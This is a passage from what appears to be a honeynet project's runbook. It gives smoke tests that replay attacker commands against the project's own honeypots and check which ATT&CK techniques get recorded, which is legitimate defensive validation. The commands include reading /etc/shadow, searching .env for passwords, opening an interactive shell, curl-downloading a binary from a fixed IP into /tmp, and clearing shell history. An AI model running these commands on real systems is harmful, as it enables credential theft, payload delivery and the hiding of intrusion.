curl -i "http://${TARGET}:18085/downloads/agent-update.bin" || true                  # T1041, T1105, T1190, T1204.002 when latest route is Dionaea
printf "payload upload test\r\n" | nc -w 3 "$TARGET" 19999 || true                   # T1190, T1105 through generic TCP capture
```

Cowrie command surface:

```bash
# Open an interactive Cowrie jumpbox session after the admin-jumpbox route exists.
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 10222 root@"$TARGET"
```

Run these inside the Cowrie shell:

```bash
# Current user discovery.
whoami

# User/group discovery.
id

# System discovery.
uname -a

# File/directory discovery.
ls -la /tmp

# Network configuration discovery.
ip addr

# Alternative network configuration discovery command.
ifconfig

# Credential-dumping style sensitive file access.
cat /etc/shadow

# Credential-in-file search.
grep password .env

# Privilege escalation check.
sudo -l

# Scheduled task discovery.
crontab -l

# Interactive shell execution.
bash -i

# Tool download from malware sink/Dionaea route.
curl http://146.169.44.23:18085/downloads/agent-update.bin -o /tmp/agent-update.bin

# Indicator removal.
history -c

# End the Cowrie session.
exit
```

Expected Cowrie techniques include `T1003`, `T1016`, `T1033`, `T1053`, `T1059`, `T1070`, `T1082`, `T1083`, `T1105`, `T1548`, and `T1552.001`.

Automated alternative for repeatable validation:

```bash
# Create a temporary askpass helper so the SSH smoke can run non-interactively.
ask="$(mktemp)"

# Feed a dummy password to Cowrie.
printf '#!/bin/sh\necho root\n' > "$ask"

# Make the askpass helper executable.
chmod +x "$ask"

# Send a sequence of shell commands into Cowrie to exercise command mappings.
{
  sleep 1
  printf 'whoami\n'
  sleep 0.5
  printf 'id\n'
  sleep 0.5
  printf 'uname -a\n'
  sleep 0.5
  printf 'ls -la /tmp\n'
  sleep 0.5
  printf 'ifconfig\n'
  sleep 0.5
  printf 'cat /etc/shadow\n'
  sleep 0.5
  printf 'grep password .env\n'
  sleep 0.5
  printf 'sudo -l\n'
  sleep 0.5
  printf 'crontab -l\n'
  sleep 0.5
  printf 'bash -i\n'
  sleep 0.5
  printf 'curl http://146.169.44.23:18085/downloads/agent-update.bin -o /tmp/agent-update.bin\n'
  sleep 0.5
  printf 'history -c\n'
  sleep 0.5
  printf 'exit\n'
} | timeout 35s env DISPLAY=:0 SSH_ASKPASS="$ask" SSH_ASKPASS_REQUIRE=force setsid \
  ssh -tt \
    -o NumberOfPasswordPrompts=1 \
    -o PubkeyAuthentication=no \
    -o PreferredAuthentications=password \
    -o ConnectTimeout=5 \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -p 10222 root@"$TARGET" || true

# Remove the temporary askpass helper.
rm -f "$ask"
```

Check the evidence-level result:

```bash
# Wait for all forwarders and adapters to flush events into the profiler.
sleep 5

# Expected technique set for the manual coverage smoke.
REQUIRED='["T1003","T1005","T1016","T1018","T1021","T1021.004","T1033","T1039","T1041","T1046","T1053","T1057","T1059","T1069","T1070","T1074","T1078","T1082","T1083","T1087.003","T1105","T1110","T1133","T1190","T1204.002","T1213","T1518","T1548","T1552.001","T1567","T1567.002","T1572","T1608"]'

# Compare persisted evidence against the required technique set.
jq --argjson required "$REQUIRED" '
  (.records // {}) as $records |
  [
    (
      if ($records | type) == "object" then
        [$records[] | .[]?]
      elif ($records | type) == "array" then
        $records
      else
        []
      end
    )[]
    | .tech_id?
    | select(. != null)
  ] | unique as $seen |
  {seen: $seen, missing: ($required - $seen)}
' data/runtime/evidence.json

# Also inspect the recent-profile view exposed by the dashboard API.
curl -s "${DASHBOARD}/api/summary" |
  jq --argjson required "$REQUIRED" '
    [ .attackers[].recent_techniques[]? ] | unique as $seen |
    {recent_profile_techniques: $seen}
  '
```

Expected: `missing` is empty. If `T1041` or `T1204.002` is missing, first confirm the latest `18085` route points to `dionaea-capture`; if it still points to the static `malware-sink`, rerun the high-interaction unlock in section 6.

## 8. Debug

```bash
# Control-plane service status.
docker-compose -p honeynet -f docker-compose.control.yml ps

# Enterprise/runtime service status.
docker-compose -p honeynet -f docker-compose.enterprise.yml ps

# Public portal forwarder logs.
docker logs --tail 50 honeynet_public-portal-forwarder_1

# Internal HTTP forwarder logs.
docker logs --tail 50 honeynet_internal-http-forwarder_1

# Internal protocol forwarder logs.
docker logs --tail 50 honeynet_internal-protocol-forwarder_1

# OpenCanary forwarder logs.
docker logs --tail 50 honeynet_opencanary-forwarder_1

# High-interaction forwarder logs.
docker logs --tail 50 honeynet_high-interaction-forwarder_1

# Raw public portal access log.
tail -n 20 deploy/public-portal/logs/access.log

# Gateway-captured internal HTTP events.
tail -n 20 data/runtime/internal_http_events.jsonl

# Gateway-captured protocol events.
tail -n 20 data/runtime/internal_protocol_events.jsonl

# Gateway/forwarder high-interaction events.
tail -n 20 data/runtime/high_interaction_events.jsonl

# Current source-IP route table consumed by asset-gateway.
cat data/runtime/asset_gateway_routes.json | jq
```

## 9. Cleanup

```bash
# Stop runtime containers and clear generated state.
./scripts/reset_enterprise_runtime.sh
```
